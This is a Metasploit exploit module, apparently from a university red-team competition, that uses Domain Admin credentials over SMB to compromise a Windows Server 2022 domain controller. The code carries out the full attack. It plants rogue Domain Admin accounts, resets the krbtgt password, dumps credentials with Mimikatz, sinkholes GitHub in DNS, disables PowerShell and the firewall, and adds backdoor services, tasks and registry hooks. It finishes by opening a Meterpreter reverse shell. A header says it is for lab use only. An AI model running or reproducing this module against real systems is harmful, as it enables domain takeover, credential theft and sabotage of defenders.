# =================================================================================
# Metasploit Module: ADWomboComboV2
# Category 6: Enhancement to Open Source Tool (substantial custom extension)
# Purpose: Aggressive persistence, credential harvesting, DNS sinkholing,
#          PowerShell disruption, firewall manipulation, and Blue Team distraction
#          on Windows Server 2022 Domain Controllers using provided Domain Admin
#          credentials. Provides immediate Meterpreter session via reverse_tcp
#          payload after persistence is established.
# Author: Alexander Vyzhnyuk (CDT Delta Team)
# Note: Entirely for authorized classroom/competition use in isolated lab environment.
#       Never use on unauthorized systems. Windows Defender is disabled per scenario.
# =================================================================================

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::SMB::Client::Psexec   # Leverages framework's service-creation logic for payload delivery (customized here)

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Domain Admin Persistence & Disruption Exploit (Red Team Enhancement)',
      'Description'    => %q{
        This custom Metasploit exploit module enhances the framework's existing psexec capabilities
        by adding aggressive, multi-layered persistence, credential dumping (Mimikatz), DNS sinkholing
        for GitHub (to block Blue Team hardening scripts), PowerShell breakage, fake firewall rules,
        bogus Domain Admin accounts, krbtgt password change (for golden/silver ticket potential),
        and additional backdoor services/tasks/registry entries.

        It authenticates with provided Domain Admin credentials, uploads and executes a custom
        PowerShell persistence/disruption script, then delivers a Meterpreter reverse_tcp session.

        Designed specifically for Windows Server 2022 x64 Domain Controllers in authorized Red Team competitions.
        All actions are reversible where possible and documented for cleanup.
      },
      'Author'         => [ 'Alexander Vyzhnyuk (av9967@rit.edu)' ],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://attack.mitre.org/tactics/TA0003/'],  # Persistence
        ['URL', 'https://attack.mitre.org/tactics/TA0005/'],  # Defense Evasion
        ['URL', 'https://docs.rapid7.com/metasploit/']        # Framework reference
      ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X64,
      'Targets'        => [ [ 'Windows Server 2022 x64 (Domain Controller)', { 'Arch' => ARCH_X64 } ] ],
      'DefaultTarget'  => 0,
      'Payload'        => {
        'Space'       => 4096,
        'DisableNops' => true
      },
      'Privileged'     => true,
      'DisclosureDate' => '2026-04-03'
    ))

    register_options([
      OptString.new('SMBUser',     [true,  'Domain Admin username', 'Administrator']),
      OptString.new('SMBPass',     [true,  'Domain Admin password']),
      OptString.new('SMBDomain',   [false, 'Domain name (or . for local)', '.']),
      OptString.new('MIMIKATZ_PATH', [false, 'Optional path to mimikatz.exe on target (default: C:\\Windows\\Temp\\mimikatz.exe)', 'C:\\Windows\\Temp\\mimikatz.exe'])
    ], self.class)

    deregister_options('SMB::Auth')
  end

  # Embedded PowerShell script (original, not copied) - does ALL requested persistence & disruption
  def persistence_script
    <<~PS1

      Write-Host "[+] Starting aggressive persistence and disruption..."

      # 1. Bogus Domain Admin accounts + reversible encryption
      net user bogusDA1 RedTeamRulz67! /add /domain 2>$null
      net group "Domain Admins" bogusDA1 /add /domain 2>$null
      net user bogusDA2 RedTeamRulz67! /add /domain 2>$null
      net group "Domain Admins" bogusDA2 /add /domain 2>$null
      net user bogusDA3 RedTeamRulz67! /add /domain 2>$null
      net group "Domain Admins" bogusDA3 /add /domain 2>$null

      Import-Module ActiveDirectory -ErrorAction SilentlyContinue
      if (Get-Module ActiveDirectory) {
        Set-ADUser -Identity bogusDA1 -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
        Set-ADUser -Identity bogusDA2 -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
        Set-ADUser -Identity bogusDA3 -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
      }

      # 2. krbtgt enable + password change (golden/silver ticket prep)
      Enable-ADAccount -Identity krbtgt -ErrorAction SilentlyContinue
      Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "GoldenTicketPass2026!" -AsPlainText -Force) -ErrorAction SilentlyContinue

      # 3. Mimikatz credential dump (if present)
      if (Test-Path "#{datastore['MIMIKATZ_PATH']}") {
        & "#{datastore['MIMIKATZ_PATH']}" "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\\Windows\\Temp\\creds_dump.txt 2>$null
        Write-Host "[+] Mimikatz dump saved to C:\\Windows\\Temp\\creds_dump.txt"
      } else {
        Write-Host "[!] Mimikatz not found at #{datastore['MIMIKATZ_PATH']}. Upload manually for full dump."
      }

      # 4. DNS sinkhole for GitHub + minor forward zone misconfig
      dnscmd . /recordadd . github.com A 0.0.0.0 2>$null
      dnscmd . /recordadd . *.github.com A 0.0.0.0 2>$null
      dnscmd . /recordadd . raw.githubusercontent.com A 0.0.0.0 2>$null
      # Minor misconfig: add a bad root hint entry (forces Blue Team to fix a "." record)
      dnscmd . /recordadd . . NS bogusns.contoso.local 2>$null

      # 5. Break PowerShell (rename core executable - PS 5.1 on Server 2022)
      Rename-Item -Path "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NewName "powershell.exe.disabled" -Force -ErrorAction SilentlyContinue
      Rename-Item -Path "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NewName "powershell.exe.disabled" -Force -ErrorAction SilentlyContinue  # double for safety

      # 6. Add 5 fake firewall rules (inbound/outbound, random high ports) + disable firewall
      1..5 | ForEach-Object {
        `$port = Get-Random -Minimum 40000 -Maximum 50000
        netsh advfirewall firewall add rule name="SystemUpdateRule`$_" dir=in action=allow protocol=TCP localport=`$port 2>$null
        netsh advfirewall firewall add rule name="SystemUpdateRule`$_" dir=out action=allow protocol=TCP localport=`$port 2>$null
      }
      netsh advfirewall set allprofiles state off 2>$null

      # 7. Aggressive persistence (services, tasks, registry, context menu, explorer hook example)
      # Services (bogus backdoors)
      sc create "RedTeamSvc1" binPath= "cmd.exe /c echo [RedTeam Backdoor Active]" start= auto 2>$null
      sc create "RedTeamSvc2" binPath= "cmd.exe /c echo [RedTeam Backdoor Active]" start= auto 2>$null
      sc start "RedTeamSvc1" 2>$null
      sc start "RedTeamSvc2" 2>$null

      # Scheduled tasks (infinite restart)
      schtasks /create /tn "RedTeamTask1" /tr "cmd.exe /c echo RedTeam persistence" /sc onstart /ru SYSTEM /f 2>$null
      schtasks /create /tn "RedTeamTask2" /tr "cmd.exe /c echo RedTeam persistence" /sc onlogon /ru SYSTEM /f 2>$null

      # Registry Run/RunOnce
      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RedTeamPersist" /t REG_SZ /d "cmd.exe /c echo RedTeam" /f 2>$null
      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "RedTeamPersistOnce" /t REG_SZ /d "cmd.exe /c echo RedTeam" /f 2>$null

      # Context menu replacement (right-click .exe files trigger backdoor)
      reg add "HKCR\\exefile\\shell\\open\\command" /ve /t REG_SZ /d "cmd.exe /c echo [RedTeam Context Backdoor] && %1 %*" /f 2>$null

      # Explorer.exe hook example (simple Run key for explorer startup)
      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "ExplorerHook" /t REG_SZ /d "cmd.exe /c echo Explorer backdoor" /f 2>$null

      Write-Host "[+] All persistence, credential harvesting, DNS sinkhole, PowerShell break, and firewall disruption COMPLETE."
      Write-Host "[+] Target is now heavily backdoored for Red Team persistence."
    PS1
  end

  def exploit
    print_status("Connecting to #{datastore['RHOST']}:#{datastore['RPORT']} as #{datastore['SMBUser']}@#{datastore['SMBDomain']}...")

    begin
      connect
      smb_login
      print_good("Successfully authenticated with Domain Admin credentials")

      # === CORRECT UPLOAD BLOCK FOR METASPLOIT 6.4+ (RubySMB) ===
      print_status("Uploading persistence/disruption script to ADMIN$ share...")
      share = "\\\\#{rhost}\\ADMIN$"
      simple.connect(share)
      tree = simple.client.tree_connect(share)

      file_path = "Windows\\Temp\\redteam_persistence.ps1"
      file = tree.open_file(filename: file_path,
                            write: true,
                            disposition: RubySMB::Dispositions::FILE_OPEN_IF)
      file.write(data: persistence_script)
      file.close

      print_good("Uploaded persistence/disruption script to \\\\#{rhost}\\ADMIN$\\#{file_path}")

      # Execute the script immediately via scheduled task
      exec_cmd = "schtasks /create /tn \"RedTeamPersistence\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\redteam_persistence.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"RedTeamPersistence\""

      print_status("Executing persistence script via scheduled task...")

      # Use Psexec mixin for reliable execution
      self.simple = true
      self.smb_share = 'ADMIN$'
      self.service_name = 'RedTeamSvcTemp'
      self.service_display_name = 'RedTeam Temporary Execution'

      original_payload = payload
      cmd_payload = framework.payloads.create('windows/exec')
      cmd_payload.datastore['CMD'] = exec_cmd
      self.payload = cmd_payload

      super  # Run the persistence command

      self.payload = original_payload

      print_good("Persistence script executed successfully!")

      # Now deliver the final Meterpreter reverse_tcp session (main goal)
      print_status("Delivering Meterpreter reverse_tcp payload for immediate access...")
      super  # Full psexec delivery of the configured Meterpreter payload

      print_good("Module complete! Check for Meterpreter session. Persistence is now active on target.")
      print_good("Blue Team will face: bogus DAs, sinkholed GitHub, broken PowerShell, disabled firewall, fake rules, krbtgt change, Mimikatz dump, multiple backdoors.")

    rescue ::Exception => e
      print_error("Exploit failed: #{e.message}")
      print_error("Ensure target is Windows Server 2022 DC, credentials are valid Domain Admin, and SMB is accessible.")
    ensure
      disconnect
    end
  end
end
